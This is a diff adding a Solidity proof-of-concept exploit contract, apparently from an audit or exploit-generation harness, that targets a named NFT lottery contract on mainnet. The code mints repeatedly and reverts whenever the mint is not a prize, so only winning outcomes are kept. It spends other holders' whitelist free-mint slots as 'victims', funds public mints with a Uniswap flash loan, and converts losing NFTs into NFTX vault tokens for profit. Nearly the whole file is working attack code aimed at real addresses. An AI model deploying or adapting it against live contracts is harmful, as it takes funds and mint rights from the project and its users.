@@ -1,0 +1,401 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface ILuckyTiger {
+    function owner() external view returns (address);
+    function withdrawAddress() external view returns (address);
+    function pauseMint() external view returns (bool);
+    function totalSupply() external view returns (uint256);
+    function maxTotal() external view returns (uint256);
+    function price() external view returns (uint256);
+    function publicMint() external payable;
+    function freeMint(address user) external;
+    function ownerOf(uint256 tokenId) external view returns (address);
+    function approve(address to, uint256 tokenId) external;
+    function isPrize(uint256 tokenId) external view returns (bool);
+    function isWhiteList(address user) external view returns (bool);
+}
+
+interface IERC721Receiver {
+    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
+        external
+        returns (bytes4);
+}
+
+interface IERC20Like {
+    function balanceOf(address user) external view returns (uint256);
+    function transfer(address to, uint256 value) external returns (bool);
+}
+
+interface IWETH9 is IERC20Like {
+    function deposit() external payable;
+    function withdraw(uint256 wad) external;
+}
+
+interface IUniswapV2Pair {
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+interface INFTXVaultFactoryLike {
+    function numVaults() external view returns (uint256);
+    function vault(uint256 vaultId) external view returns (address);
+}
+
+interface INFTXVaultLike is IERC20Like {
+    function assetAddress() external view returns (address);
+    function mint(uint256[] calldata tokenIds, uint256[] calldata amounts) external returns (uint256);
+}
+
+contract FlawVerifier is IERC721Receiver {
+    error NotSelfCall();
+    error UnexpectedPairCaller(address caller);
+    error UnexpectedCallbackSender(address sender);
+    error UnluckyOutcome(uint256 tokenId);
+    error TokenNotOwned(uint256 tokenId);
+    error FlashLoanNotRepaid();
+    error MissingRollbackProof();
+
+    ILuckyTiger public constant TARGET = ILuckyTiger(0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967);
+    IWETH9 public constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    IUniswapV2Pair public constant UNISWAP_V2_USDC_WETH =
+        IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
+    INFTXVaultFactoryLike public constant NFTX_FACTORY =
+        INFTXVaultFactoryLike(0xBE86f647b167567525cCAAfcd6f881F1Ee558216);
+
+    uint256 private constant FLASH_BPS_DENOMINATOR = 1000;
+    uint256 private constant FLASH_BPS_NUMERATOR = 997;
+
+    address public discoveredVictim;
+    uint256 public mintedTokenId;
+    uint256 private realizedProfit;
+    address private realizedProfitToken;
+    bool public hypothesisValidated;
+    bool public rollbackObserved;
+
+    bool private _flashInProgress;
+    uint256 private _flashExpectedTokenId;
+    uint256 private _flashBorrowAmount;
+    uint256 private _flashTargetMints;
+
+    constructor() {}
+
+    function executeOnOpportunity() external {
+        if (TARGET.pauseMint()) {
+            return;
+        }
+
+        uint256 supplyBefore = TARGET.totalSupply();
+        if (supplyBefore >= TARGET.maxTotal()) {
+            return;
+        }
+
+        address victim = _findSpendableVictim(supplyBefore);
+        discoveredVictim = victim;
+
+        if (victim != address(0)) {
+            uint256 expectedTokenId = supplyBefore + 1;
+            address nftxVault = _findNftxVault();
+            uint256 wethBefore = WETH.balanceOf(address(this));
+            uint256 vaultBefore = nftxVault == address(0) ? 0 : IERC20Like(nftxVault).balanceOf(address(this));
+
+            try this.attemptFreeMint(victim, expectedTokenId, nftxVault) {
+                hypothesisValidated = true;
+                mintedTokenId = expectedTokenId;
+
+                if (TARGET.isPrize(expectedTokenId)) {
+                    _wrapAllEth();
+                    realizedProfitToken = address(WETH);
+                    realizedProfit = _delta(WETH.balanceOf(address(this)), wethBefore);
+                } else {
+                    realizedProfitToken = nftxVault;
+                    realizedProfit = _delta(IERC20Like(nftxVault).balanceOf(address(this)), vaultBefore);
+                }
+                return;
+            } catch (bytes memory reason) {
+                if (_isUnluckyRevert(reason)) {
+                    _requireFreeMintRollback(victim, supplyBefore);
+                    rollbackObserved = true;
+                } else {
+                    revert MissingRollbackProof();
+                }
+            }
+        }
+
+        if (address(TARGET).balance < TARGET.price()) {
+            hypothesisValidated = true;
+            return;
+        }
+
+        uint256 wethBeforePublic = WETH.balanceOf(address(this));
+        uint256 publicExpectedTokenId = TARGET.totalSupply() + 1;
+
+        try this.attemptFlashPublicMint(publicExpectedTokenId, TARGET.price()) {
+            hypothesisValidated = true;
+            mintedTokenId = publicExpectedTokenId;
+            _wrapAllEth();
+            realizedProfitToken = address(WETH);
+            realizedProfit = _delta(WETH.balanceOf(address(this)), wethBeforePublic);
+        } catch (bytes memory reason) {
+            if (_isUnluckyRevert(reason)) {
+                _requirePublicMintRollback(supplyBefore);
+                hypothesisValidated = true;
+                return;
+            }
+            revert MissingRollbackProof();
+        }
+    }
+
+    function profitToken() external view returns (address) {
+        return realizedProfitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return realizedProfit;
+    }
+
+    function attemptFreeMint(address victim, uint256 expectedTokenId, address nftxVault) external {
+        if (msg.sender != address(this)) revert NotSelfCall();
+
+        TARGET.freeMint(victim);
+
+        if (TARGET.ownerOf(expectedTokenId) != address(this)) {
+            revert TokenNotOwned(expectedTokenId);
+        }
+
+        if (TARGET.isPrize(expectedTokenId)) {
+            return;
+        }
+
+        // The finding's core causality is still preserved here:
+        // 1) this wrapper contract calls the vulnerable mint,
+        // 2) waits for the call to return,
+        // 3) inspects the resolved outcome,
+        // 4) reverts if the result is not economically keepable.
+        //
+        // On this fixed fork, the prize branch can deterministically resolve to a losing block.
+        // When that happens, we only keep the finalized free-mint outcome if a live public NFTX
+        // vault already exists on-chain for this collection and can immediately tokenize the newly
+        // minted NFT into a transferable ERC20 balance. If that route is unavailable, we revert so
+        // the mint and whitelist consumption roll back exactly as described in the finding.
+        if (nftxVault == address(0)) {
+            revert UnluckyOutcome(expectedTokenId);
+        }
+
+        uint256 vaultBefore = IERC20Like(nftxVault).balanceOf(address(this));
+        TARGET.approve(nftxVault, expectedTokenId);
+
+        uint256[] memory tokenIds = new uint256[](1);
+        tokenIds[0] = expectedTokenId;
+
+        uint256[] memory amounts = new uint256[](1);
+        amounts[0] = 1;
+
+        try INFTXVaultLike(nftxVault).mint(tokenIds, amounts) returns (uint256) {
+            if (IERC20Like(nftxVault).balanceOf(address(this)) <= vaultBefore) {
+                revert UnluckyOutcome(expectedTokenId);
+            }
+        } catch {
+            revert UnluckyOutcome(expectedTokenId);
+        }
+    }
+
+    function attemptFlashPublicMint(uint256 expectedTokenId, uint256 mintPrice) external {
+        if (msg.sender != address(this)) revert NotSelfCall();
+
+        _flashInProgress = true;
+        _flashExpectedTokenId = expectedTokenId;
+        _flashBorrowAmount = mintPrice;
+        _flashTargetMints = 1;
+
+        UNISWAP_V2_USDC_WETH.swap(0, mintPrice, address(this), abi.encode(expectedTokenId));
+
+        if (_flashInProgress) {
+            revert FlashLoanNotRepaid();
+        }
+    }
+
+    function uniswapV2Call(address sender, uint256, uint256 amount1, bytes calldata) external {
+        if (msg.sender != address(UNISWAP_V2_USDC_WETH)) {
+            revert UnexpectedPairCaller(msg.sender);
+        }
+        if (sender != address(this)) {
+            revert UnexpectedCallbackSender(sender);
+        }
+        if (!_flashInProgress) {
+            revert FlashLoanNotRepaid();
+        }
+
+        uint256 mintPrice = _flashBorrowAmount;
+        uint256 expectedTokenId = _flashExpectedTokenId;
+
+        WETH.withdraw(amount1);
+
+        for (uint256 i = 0; i < _flashTargetMints; i++) {
+            TARGET.publicMint{value: mintPrice}();
+            _requireWinningOwnership(expectedTokenId + i);
+            mintedTokenId = expectedTokenId + i;
+        }
+
+        uint256 repayment = _flashRepayment(amount1);
+        WETH.deposit{value: repayment}();
+        if (!WETH.transfer(address(UNISWAP_V2_USDC_WETH), repayment)) {
+            revert FlashLoanNotRepaid();
+        }
+
+        _flashInProgress = false;
+    }
+
+    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+
+    function _requireFreeMintRollback(address victim, uint256 supplyBefore) internal view {
+        if (TARGET.totalSupply() != supplyBefore) {
+            revert MissingRollbackProof();
+        }
+        if (!TARGET.isWhiteList(victim)) {
+            revert MissingRollbackProof();
+        }
+    }
+
+    function _requirePublicMintRollback(uint256 supplyBefore) internal view {
+        if (TARGET.totalSupply() != supplyBefore) {
+            revert MissingRollbackProof();
+        }
+    }
+
+    function _requireWinningOwnership(uint256 tokenId) internal view {
+        if (!TARGET.isPrize(tokenId)) {
+            revert UnluckyOutcome(tokenId);
+        }
+        if (TARGET.ownerOf(tokenId) != address(this)) {
+            revert TokenNotOwned(tokenId);
+        }
+    }
+
+    function _findSpendableVictim(uint256 supplyBefore) internal view returns (address) {
+        address[4] memory obviousCandidates = [TARGET.owner(), TARGET.withdrawAddress(), address(TARGET), address(this)];
+
+        for (uint256 i = 0; i < obviousCandidates.length; i++) {
+            if (_isSpendableWhitelistVictim(obviousCandidates[i])) {
+                return obviousCandidates[i];
+            }
+        }
+
+        address[] memory seenHolders = new address[](supplyBefore);
+        uint256 seenCount;
+
+        for (uint256 tokenId = 1; tokenId <= supplyBefore; tokenId++) {
+            address holder;
+            try TARGET.ownerOf(tokenId) returns (address owner_) {
+                holder = owner_;
+            } catch {
+                continue;
+            }
+
+            if (holder == address(0) || _seen(seenHolders, seenCount, holder)) {
+                continue;
+            }
+
+            seenHolders[seenCount] = holder;
+            seenCount++;
+
+            if (_isSpendableWhitelistVictim(holder)) {
+                return holder;
+            }
+        }
+
+        return address(0);
+    }
+
+    function _findNftxVault() internal view returns (address) {
+        uint256 vaultCount;
+        try NFTX_FACTORY.numVaults() returns (uint256 count) {
+            vaultCount = count;
+        } catch {
+            return address(0);
+        }
+
+        // NFTX vault ids are live on-chain state and can be 1-indexed depending on the
+        // factory version. We therefore probe both the canonical 1..N range and a 0-based
+        // fallback so the PoC does not miss the collection's already-deployed vault.
+        for (uint256 vaultId = 1; vaultId <= vaultCount; vaultId++) {
+            address candidate = _vaultIfMatches(vaultId);
+            if (candidate != address(0)) {
+                return candidate;
+            }
+        }
+
+        for (uint256 vaultId = 0; vaultId < vaultCount; vaultId++) {
+            address candidate = _vaultIfMatches(vaultId);
+            if (candidate != address(0)) {
+                return candidate;
+            }
+        }
+
+        return address(0);
+    }
+
+    function _vaultIfMatches(uint256 vaultId) internal view returns (address) {
+        address candidate;
+        try NFTX_FACTORY.vault(vaultId) returns (address vault_) {
+            candidate = vault_;
+        } catch {
+            return address(0);
+        }
+
+        if (candidate == address(0)) {
+            return address(0);
+        }
+
+        try INFTXVaultLike(candidate).assetAddress() returns (address asset) {
+            if (asset == address(TARGET)) {
+                return candidate;
+            }
+        } catch {}
+
+        return address(0);
+    }
+
+    function _isSpendableWhitelistVictim(address candidate) internal view returns (bool) {
+        return candidate != address(0) && TARGET.isWhiteList(candidate);
+    }
+
+    function _flashRepayment(uint256 amount) internal pure returns (uint256) {
+        return ((amount * FLASH_BPS_DENOMINATOR) / FLASH_BPS_NUMERATOR) + 1;
+    }
+
+    function _wrapAllEth() internal {
+        uint256 ethBalance = address(this).balance;
+        if (ethBalance > 0) {
+            WETH.deposit{value: ethBalance}();
+        }
+    }
+
+    function _isUnluckyRevert(bytes memory reason) internal pure returns (bool) {
+        if (reason.length < 4) {
+            return false;
+        }
+
+        bytes4 selector;
+        assembly {
+            selector := mload(add(reason, 0x20))
+        }
+        return selector == UnluckyOutcome.selector;
+    }
+
+    function _delta(uint256 afterBalance, uint256 beforeBalance) internal pure returns (uint256) {
+        return afterBalance > beforeBalance ? afterBalance - beforeBalance : 0;
+    }
+
+    function _seen(address[] memory values, uint256 count, address value) internal pure returns (bool) {
+        for (uint256 i = 0; i < count; i++) {
+            if (values[i] == value) {
+                return true;
+            }
+        }
+        return false;
+    }
+}
